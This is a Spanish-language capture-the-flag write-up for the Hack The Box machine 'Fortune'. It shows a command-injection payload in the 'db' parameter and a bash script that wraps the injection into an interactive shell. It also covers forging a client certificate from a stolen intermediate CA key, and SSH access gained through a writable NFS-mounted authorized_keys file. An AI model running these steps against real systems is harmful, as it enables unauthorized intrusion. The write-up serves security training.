--------
- Tags;  #command-injection #openssl #certificates #pfx #pem #csr #pkcs12 #nfs #crypto #sqlite3 
- ------
## Técnicas utilizadas
- Command Injection  
- OpenSSL - Creating a new key  
- OpenSSL - Creating a CSR file (Certificate Signing Request)  
- OpenSSL - Creating a PEM file  
- OpenSSL - Creating a PFX file (pkcs12) to import it into the Firefox browser  
- NFS share mount  
- Editing our user ID in order to gain access to the NFS directories  
- Code Analysis - Crypto Challenge
## Procedimiento
![[Pasted image 20230722000318.png]]

---------
#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina victima podemos encontrar los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80,443 10.10.10.127 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 11:49 MST
Nmap scan report for 10.10.10.127
Host is up (0.13s latency).

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07ca21f4e0d2c69ea8f761dfd7efb1f4 (RSA)
|   256 304b25471784af60e280209dfd868846 (ECDSA)
|_  256 93564aee879df65bf9d925a6d8e0087e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=fortune.htb/organizationName=Fortune Co HTB/stateOrProvinceName=ON/countryName=CA
| Not valid before: 2018-10-30T01:13:42
|_Not valid after:  2019-11-09T01:13:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
```

Un escaneo sobre las tecnologías web con **WhatWeb** nos muestra esto:
```ruby
# whatweb 10.10.10.127 && whatweb 10.10.10.127:443
http://10.10.10.127 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.127], Title[Fortune], X-UA-Compatible[IE=edge]
ERROR Opening: http://10.10.10.127:443 - end of file reached
```

----------
#### Command Injection
Si visitamos la pagina Web que esta protegida por SSL, nos encontraremos con que no podemos visualiazarla debido a que no dis ponemos de un certificado. 
Por otro lado, en el puerto 80 tenemos un tipo de **juego** que nos indica que selecionemos una base de datos, al hacerlo nos redirige a una pagina donde se nos muestra nuestra "Fortuna".
Esta petición la pasaremos por **BurpSuite** para intentar jugar con ella un poco, al hacerlo, nos daremos cuenta de que no se puede colocar cualquier cosa, si no que especificamente debe contener el nombre de alguna de las bases de datos que se nos indican ahi.
Probaremos tirar de **Wfuzz** para intentar descubrir si existen algunos caracteres que nos esten devolviando una respuesta diferente:
```
# wfuzz -c --hc=404 -w /usr/share/SecLists/Fuzzing/special-chars.txt -d "db=FUZZ" http://10.10.10.10/
```

La respuesta nos indican los tipicos caracteres que vemos en comandos a nivel de sistema:
![[Pasted image 20230727122333.png]]

Probablemente, si colocamos un `; whoami` nos interepretara el comando y nos lo mostrara por pantalla:
![[Pasted image 20230727122402.png]]

Al intentar entablarnos una reverse shell, nos percataremos de que no es posible. Ni siquiera podremos tirarnos un `ping` ni un `curl`. Podemos estar trabajando desde el **Repeater** de **BurpSuite** o para mayor comodidad crearnos un script en **bash**:
```bash
#!/bin/bash

# Ctrl + C
function ctrl_c(){
	echo -n "\n[!] Saliendo..."
	exit 1
}
trap ctrl_c INT

while true; do

	echo -n "[#] > " && read -r  myCommand
	echo; curl -s -X POST "http://10.10.10.10/select" --data "db=; echo sexcott; $myCommand" | awk '/sexcott/,/<\/pre>/' | grep -vE "sexcott|</pre>"
done
```

Leyendo archivos del sistema, llegamos a dar con uno interesante el cual parece ser una conexión a una base de datos:
```python
from flask import Flask, request, render_template
import psycopg2

app = Flask(__name__)

def db_write(key_str):
  result = True
  params = [ request.remote_addr, key_str, key_str ]
  sql_insert = "INSERT INTO authorized_keys (uid, creator, key) VALUES ('nfsuser', %s, %s) ON CONFLICT ON CONSTRAINT authorized_keys_pkey DO UPDATE SET key=%s;"
  try:
    conn = psycopg2.connect("host=localhost dbname=authpf user=appsrv")
    curs = conn.cursor()
    curs.execute(sql_insert, params)
  except:
    result = False

  conn.commit()
  curs.close()
  conn.close()

  return result

@app.route('/generate', methods=['GET'])
def sshauthd():

  # SSH key generation code courtesy of:
  # https://msftstack.wordpress.com/2016/10/15/generating-rsa-keys-with-python-3/
  #
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.backends import default_backend

  # generate private/public key pair
  key = rsa.generate_private_key(backend=default_backend(), public_exponent=65537, \
    key_size=2048)

  # get public key in OpenSSH format
  public_key = key.public_key().public_bytes(serialization.Encoding.OpenSSH, \
    serialization.PublicFormat.OpenSSH)

  # get private key in PEM container format
  pem = key.private_bytes(encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption())

  # decode to printable strings
  private_key_str = pem.decode('utf-8')
  public_key_str = public_key.decode('utf-8')

  db_response = db_write(public_key_str)

  if db_response == False:
    return render_template('error.html')
  else:
    return render_template('display.html', private_key=private_key_str, public_key=public_key_str)
```

En esta, viene un nombre de usuario: **Authpf**. Si buscamos por internet, nos damos que cuando este usuario suele existir es por que existen ciertas reglas a nivel de **Package Filter** el cual, si nos llegamos a conectar po SSH, tomaria nuestra IP y la colocaria en una WhiteList, esto se explica mejor en el siguiente [Articulo](https://man.freebsd.org/cgi/man.cgi?query=authpf&sektion=8&n=1).
  
Dentro de los directorios del usuario **Bob** encontramos un **Intermediate.cert.pem** con el cual podemos crearnos un archivo **.pfx** con nla herramienta **OpenSSL**.
Lo que tendriamos que hacer es copiar el contenido del archivo **Intermediate.cert.pem** a un archivo en nuestra maquina ( este seria el certificado ) y el **Intermediate.key.pem** ( este seria el key ).
Con estos archivos en nuestra disposición, lo siguiente es seguir estos pasos:

##### OpenSSL - Creating a new key
1. Generar una PEM RSA private key: `# openssl genrsa -out sexcott.key 2048`
##### OpenSSL - Creating a CSR file (Certificate Signing Request)  
3. Generar un Certificate Signing Request: `# openssl req -new -key sexcott.key -out sexcott.csr`
##### OpenSSL - Creating a PEM file
5. Generar un archivo PEM: `# openssl x509 -req -in sexcott.csr -CA intermediate.cert -CAkey intermediate.key -CAcreateserial -out sexcott.pem -days 3 -sha256`
#####  OpenSSL - Creating a PFX file (pkcs12) to import it into the Firefox browser  
7. Generar el PFX: `# openssl pkcs12 -export -out sexcott.pfx -inkey sexcott.key -in sexcott.pem -certfile intermediate.cert`

Ahora con el **PFX**, podemos importarlo en nuestro navegador ( en esta caso **Google Chrome** ) y navegar por la pagina que antes no podiamos ( la del puerto 443 protegida por ssl ).
De primeras, cuando visitamos la web podemos ver el siguiente mensaje:
![[Pasted image 20230727130725.png]]

-------
#### NFS share mount  
Si damos click en **generate** nos redirige a una pagina donde vemos una clave publica y una **id_rsa**. Como solo existen 3 usuarios a nivel de sistema que cuentan con directorios en **/home/** podemos intentar conectarnos a uno de estos con la **id_rsa** y damos con el correcto:
![[Pasted image 20230727130922.png]]

Como habiamos leido en el [articulo](https://man.freebsd.org/cgi/man.cgi?query=authpf&sektion=8&n=1) mencionado anteriormente, cuando nos conectaramos por SSH a la maquina a través del usuario **nfsuser** se iban aplicar algunas reglas a nivel de **IpTables** las cuales nos dejaran visualizar nuevos puertos abiertos. Si aplicamos un escaneo con **nmap** sobre la maquina ahora podemos visualizar estos puertos abiertos:
```ruby
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG Scan 10.10.10.127
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 13:08 MST
Initiating SYN Stealth Scan at 13:08
Not shown: 62928 filtered tcp ports (no-response), 2600 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 63
80/tcp   open  http            syn-ack ttl 63
111/tcp  open  rpcbind         syn-ack ttl 63
443/tcp  open  https           syn-ack ttl 63
681/tcp  open  entrust-aams    syn-ack ttl 63
2049/tcp open  nfs             syn-ack ttl 63
8081/tcp open  blackice-icecap syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
Raw packets sent: 129307 (5.690MB) | Rcvd: 2608 (104.348KB)
```

Nos interesa principalmente el puerto **2049** que suele corresponder a **NFS**. Hacktricks tiene un [articulo](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting) que nos muestra como enumerar este servicio con más profundidad.

**Muestra directorios disposibles para montar**
```
# showmount -e 10.10.10.10
```

**Montar el directorio**
```
# mount -t nfs 10.10.10.10:/home /mnt/mount/
```

Enumerando los directorios, encontramos que tenemos permisos de escrituras sobre la carpeta **.ssh** de alguno de ellos. Asi que podemos meter nuestro **id_rsa.pub** en el **authorized_keys** para conectarnos por **ssh** sin proporcinar contraseña.

-----------------
#### Code Analysis - Crypto Challenge
Si enumeramos los grupos a los que pertenecemos, nos encontramos con que somos parte de **Wheel** y de antes habiamos visto que habia un directorio donde este grupo tenia capacidad de lectura:
![[Pasted image 20230727132907.png]]

Dentro de este hay un archivo **.db** que esta en **Sqlite3**. Lo podemos transferir a nuestra maquina para echarle un ojo. Listando las bases de datos con sus tablas, llegamos a dar con unos hashes en **bcrypt**:
![[Pasted image 20230727133758.png]]

Por otro lado, encontramos un texto encriptado:
![[Pasted image 20230727133816.png]]

Si le echamos un ojo al archivo **pgadmin4.ini** encontramos algunas rutas:
```
Image Paths
```

Si visitamos estas, y dentro filtramos por cadenas que contengan la palabra "decrypt" encontramos un archivo que de primeras llama la atención:
```
Image Decrypt.py
```

Podemos traenos este codigo e intentar desencriptar el texto. Dentro del codigo vemos que tenemos que proporcionar una **ciphertext** y una **key**. En este caso vamos a proporcionar el texto encriptado y como key vamos a poner el **hash** de bob que encontramos en la base de datos. Lanzamos el script en python y nos da la siguiente contraseña:
```
Image New Passsword
```

Esta misma, pertecene al usuario **root.**

